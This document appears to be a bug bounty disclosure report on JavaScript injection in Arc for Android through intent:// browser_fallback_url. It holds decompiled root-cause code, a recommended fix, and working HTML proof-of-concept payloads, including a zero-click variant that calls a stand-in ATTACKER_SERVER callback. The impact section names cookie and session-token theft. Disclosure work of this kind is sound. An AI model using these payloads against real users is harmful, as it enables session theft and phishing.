# JavaScript Injection via `intent://` `browser_fallback_url` in Arc for Android

**Platform:** HackerOne — The Browser Company (Arc)
**Severity:** High (CVSS 3.1: 8.8)
**Status:** Ready to submit
**Confirmed on:** Arc for Android v1.12.7 (versionCode 92), Android 10, WebView Chrome/145.0.7632.159

---

## Title

```
JavaScript injection via intent:// browser_fallback_url in Arc for Android
allows any webpage to execute arbitrary JS in the victim's WebView
```

---

## Summary

An attacker who controls any webpage can execute arbitrary JavaScript inside Arc for Android's WebView. By embedding an `intent://` link with `S.browser_fallback_url=javascript:...`, Arc's "Open in App" Deny handler passes the attacker-controlled value directly to `webView.loadUrl()` with no scheme validation. **The attack requires only a single user interaction: tapping Deny on the dialog.** The exploit also triggers automatically on page load (zero-click navigation), meaning the dialog can appear without the victim ever tapping a link.

I confirmed code execution with three independent proofs:

1. **HTTP callback (link tap):** WebView navigated to `http://localhost:8080/xss_callback`. Server received `GET /xss_callback` from `Chrome/145.0.7632.159 Mobile` (Arc's WebView UA). WebView rendered the server's response body `XSS_OK`.
2. **Visual DOM proof:** `javascript:document.body.style.background='lime'` — page rendered the string `lime`, confirming JS executed and returned a value.
3. **Zero-click HTTP callback:** Using `window.location = "intent://..."` in a `setTimeout` on page load, the "Open in App" dialog appeared automatically with no link tap. After Deny, server received `GET /xss_callback?src=zeroclick` — JavaScript executed with zero user-initiated clicks.

---

## Vulnerability Details

**CVSS 3.1 Score:** 8.8 High
**Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`

| Factor | Value | Reason |
|--------|-------|--------|
| Attack Vector | Network | Attacker hosts a webpage, no proximity needed |
| Attack Complexity | Low | Straightforward, no race condition |
| Privileges Required | None | Any webpage, no account needed |
| User Interaction | Required | Victim taps Deny only — dialog can auto-appear on page load |
| Scope | Changed | JS runs in victim's page context, not attacker's |
| Confidentiality | High | Cookie theft, page content, Arc session data |
| Integrity | High | DOM manipulation, redirect, phishing overlay |
| Availability | Low | Minor disruption |

### Root Cause — Three Files, One Missing Check

**`n2.java` — `shouldOverrideUrlLoading`:**
```java
// ANY valid URI scheme (including "intent://") bypasses http/https check
if (scheme != null && !scheme.equals("https") && !scheme.equals("http")
    && C0560s.f1571a.b(scheme)) {   // regex: ^[a-zA-Z][a-zA-Z0-9+.-]*
    x0Var.invoke(str, string2);      // → S1.invoke(url)
    return true;
}
```

**`S1.java` — Deny handler (`f31984N == true`):**
```java
Intent uri = Intent.parseUri(p12, 2);
String stringExtra = uri.getStringExtra("browser_fallback_url");
if (stringExtra != null) {
    p02.f(stringExtra);   // → webView.loadUrl(stringExtra)
                          // NO scheme check — javascript: URI executes
}
```

`browser_fallback_url` is extracted from the Intent extras and passed directly to `webView.loadUrl()`. There is no check that the value is an `http://` or `https://` URL.

**`C0560s.java`:**
```java
// Matches any valid URI scheme — intent:// passes
public static final x8.e f1571a = new x8.e("^[a-zA-Z][a-zA-Z0-9+.-]*");
```

### Technical Note — Correct Intent URI Format

The `browser_fallback_url` value must be encoded as a String extra using the `S.` type prefix for `Intent.parseUri` to parse it correctly:

```
S.browser_fallback_url=javascript:...   ← correct (String extra)
browser_fallback_url=javascript:...     ← URISyntaxException at parseUri
```

Without `S.`, Android throws `URISyntaxException: unknown EXTRA type` and the exploit fails. The correct format (with `S.`) works silently.

---

## Steps to Reproduce

### Setup
- Arc for Android v1.12.7 installed
- Local HTTP server on port 8080 (or any internet-accessible server)

### Attacker's Malicious Page

```html
<!DOCTYPE html>
<html>
<body>
<!-- HTTP callback proof -->
<a href="intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://ATTACKER_SERVER/xss_callback';end">
  Tap here
</a>

<!-- Visual DOM proof (no server needed) -->
<a href="intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:document.body.style.background='lime';end">
  Tap here (visual)
</a>
</body>
</html>
```

### Reproduction Steps (Standard — link tap required)

1. Open Arc for Android, navigate to the attacker's page
2. Tap the first link
3. Arc shows "Open in App — Allow this content to open outside of Arc Search?"
4. Tap **Deny**
5. `webView.loadUrl("javascript:location='http://ATTACKER_SERVER/xss_callback'")` is called
6. JavaScript executes — WebView navigates to `http://ATTACKER_SERVER/xss_callback`
7. Server receives the request; WebView renders the response body

### Reproduction Steps (Zero-Click — no link tap)

The dialog can also be triggered automatically on page load using `window.location` in a `setTimeout`, requiring **zero** deliberate link taps from the victim:

```html
<script>
  setTimeout(function() {
    window.location = "intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://ATTACKER_SERVER/xss_callback?src=zeroclick';end";
  }, 1500);
</script>
```

1. Victim opens the attacker's page in Arc
2. After 1.5 seconds, "Open in App" dialog appears automatically
3. Victim taps **Deny** (the only interaction)
4. JavaScript executes — server receives `GET /xss_callback?src=zeroclick`

---

## Proof of Exploitation

### HTTP Callback — Server Log (exact output)

```
============================================================
[!] XSS CALLBACK RECEIVED at 2026-03-26 06:43:23.158434
[!] Path: /xss_callback
[!] Params: {}
[!] User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36
               (KHTML, like Gecko) Chrome/145.0.7632.159 Mobile
               Version/4.0 Safari/537.36
============================================================
[06:43:23] 127.0.0.1 - "GET /xss_callback HTTP/1.1" 200 -
```

### WebView Screenshots

| File | Shows |
|------|-------|
| `01_open_in_app_dialog.png` | Arc's "Open in App" dialog triggered by the intent link |
| `02_visual_proof_lime.png` | WebView rendered text `lime` — confirms JS executed (see note below) |
| `03_http_callback_xss_ok.png` | WebView rendered `XSS_OK` — server response body in browser |
| `04_server_log.txt` | Raw server log with Chrome UA |
| `05_poc8.html` | Minimal self-contained PoC, zero external dependencies |
| `06_poc9_zeroclick_dialog.png` | "Open in App" dialog appearing automatically with no link tap |
| `07_poc9_zeroclick_xssok.png` | WebView rendered `XSS_OK` after zero-click Deny — confirms zero-click execution |
| `arc_xss_final.mp4` | Screen recording — side-by-side: phone + live server log |

> **Note on `02_visual_proof_lime.png`:** The page shows the plain text `lime` on a white background, not a green background. This is expected `javascript:` URI behavior: when the expression returns a non-undefined string, the WebView replaces the page content with that string as plain text. `document.body.style.background='lime'` executed successfully (the assignment ran), and the return value `'lime'` caused the page to be replaced with the text `lime`. The text appearing is direct proof of execution — an unexecuted payload would show no change at all. The primary HTTP callback proof (`03_http_callback_xss_ok.png` + `04_server_log.txt`) is the stronger evidence.

---

## Impact

An attacker can execute arbitrary JavaScript in Arc for Android's WebView. The code runs in the security origin of the page that contained the intent link, which gives the attacker:

- **Cookie theft** — `document.cookie` for the current origin (including any authenticated Arc-hosted pages)
- **Session token exfiltration** — steal Arc account credentials if the user is on an Arc-authenticated page when the intent link triggers
- **DOM manipulation / phishing overlay** — rewrite the page after Deny to serve a credential phishing form
- **Silent navigation** — redirect the victim to any URL

The user interaction is minimal: in the standard variant, the victim taps a link and taps "Deny". In the zero-click variant, the dialog appears automatically on page load — the only interaction is tapping "Deny", which victims have no reason to suspect is exploitable. I confirmed the zero-click variant produces a server callback (`GET /xss_callback?src=zeroclick`) from Arc's WebView UA.

This affects all Arc for Android users on v1.12.7 and earlier who visit a page containing a malicious `intent://` link.

---

## Recommended Fix

In `S1.java`, validate `browser_fallback_url` before calling `webView.loadUrl()`:

```java
String stringExtra = uri.getStringExtra("browser_fallback_url");
if (stringExtra != null
    && (stringExtra.startsWith("https://") || stringExtra.startsWith("http://"))) {
    p02.f(stringExtra);
}
```

Reject any value that is not an `https://` or `http://` URL. This mirrors the fix Chrome applied to the same vulnerability class (CVE-2014-8910 and related intent:// handler issues).

---

## References

- Android `Intent.parseUri` docs — extras format `S.key=value`
- Chrome's `browser_fallback_url` handling (intent scheme spec)
- Related: CVE-2014-8910 — Chrome Android intent:// javascript injection
- Affected code: `u6/S1.java`, `u6/n2.java`, `D6/B.java`, `D6/C0560s.java`
